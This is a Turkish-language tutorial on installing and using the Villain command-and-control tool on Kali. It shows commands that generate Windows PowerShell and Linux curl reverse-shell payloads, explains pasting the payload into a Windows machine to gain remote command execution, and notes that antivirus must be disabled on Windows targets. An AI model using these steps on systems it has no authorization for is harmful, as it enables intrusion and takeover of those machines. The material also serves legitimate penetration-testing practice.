## KURULUM

**İki seçenek bulunmaktadır.**
1) Direkt Kali sisteminde apt komutu ile villain kurulumu:

   `apt install villain`

3) Yeni güncellemeler anında gelmeyebilir bu yüzden sırasıyla şu komutları yazarak Villain'i kurun:

   `git clone https://github.com/t3l3machus/Villain`

   `cd ./Villain`

   `pip3 install -r requirements.txt`


Bunuda kurmanız lazım:

`sudo apt update&&sudo apt install gnome-terminal`

Villian komutları:
- generate: Farklı payload türlerinde çalıştırılabilir scriptler üretir.
+ siblings: Daha önce connect edilmiş kardeş sunucuların bilgileri gösterilir.
* connect: Mevcut villain sunucusuna kardeş bağlar. Oturum yönetimi ortaklaşa bir duruma gelir.
- sessions: Aktif tüm reverse shell oturumlarını listeler.
+ backdoors: Sunucuya yerleştirilmiş backdoor tiplerinin tür statü gibi bilgileri tablo olarak gösterilir.
* sockets: villain tarafından dinlenen portlar listelenir.
- shell: Hedef sistemde komut çalıştırmayı doğrudan yapar.
+ cmdinspector: Şüpheli komut çalıştırma veya tespit önleme işlevlerini kontrol eder.

Windows için generate kodu = `generate lhost=eth0 payload=windows/reverse_tcp/powershell`

Linux için generate kodu = `generate lhost=eth0 payload=linux/hoaxshell/sh_curl`

Kardeş kullanımı için (birbirine bağlanan cihazlar birbirinin erişebildiği cihazlara erişebilir):
Villain kullanan bir cihazdan `ip a s` yazarak ip bilgisi alın ve 2.cihazda Villain çalıştırdıktan sonra `connect <ip>` komutu yazın. İstek ilk bilgisayara yollanıcak ve bir şifre girmeniz gerekicek. Onu yazdıktan sonra onay vermiş olcaksınız ve böylece bağlanma işlemi bitmiş olcak. Sonrasında ise siblings yazarak kardeş sistem bilgilerine erişebilirsiniz.

Örnek Kullanım:

Kali cihazda Villain çalıştırılır. Windows için yukardaki gibi bir generate kodu kullanılarak script oluşturulur. Oluşturulan scripti Windows cihazının powershell'ine yapıştırın ve böylece Windows cihazı Kali bilgisayarına bağlanıcaktır. `sessions` komutunu Kali cihazında yazarak erişilen Windows cihazı hakkındaki bilgileri görebilirsiniz (session id gibi). `Shell <session_id>` komutu ile Windows cihazına olan erişimi kullanarak komutlar çalıştırabiliriz. Mesela `cat "Hello" > deneme.txt` yazdığımız zaman Kali sistemimiz üzerinden Windows sisteminde deneme.txt dosyası oluşturmuş oluruz.

**Dikkat: Linux sistemlerinde herhangi bir problem yaşanmazken, Windows cihazlarda virüs tarzı korumaların kapatılması gerekmektedir!**
